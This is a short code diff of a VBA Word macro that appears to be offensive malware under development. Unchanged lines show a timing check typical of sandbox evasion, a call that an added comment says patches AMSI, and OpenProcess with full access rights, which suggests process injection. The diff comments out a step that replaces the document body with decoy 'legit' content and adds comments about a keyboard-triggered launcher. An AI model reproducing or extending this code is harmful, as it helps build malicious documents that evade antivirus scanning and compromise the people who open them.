@@ -24,9 +24,11 @@ Function mymacro()
  If subtime < 3.5 Then
     Exit Function
  End If
- ActiveDocument.Content.Select
- Selection.Delete
- ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
+ 'This portion to delete document body and replace with auto text (the "legit" content)
+ 'ActiveDocument.Content.Select
+ 'Selection.Delete
+ 'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
+ 'patch function patches AMSI
  patch
  pid = getPID
  Handle = OpenProcess(&H1F0FFF, False, pid)
@@ -86,5 +88,6 @@ Sub test()
 mymacro
 End Sub
 Sub queen()
+    'queen is the keyboard mapped macro to run the main test function.
     Application.Run MacroName:="test"
 End Sub
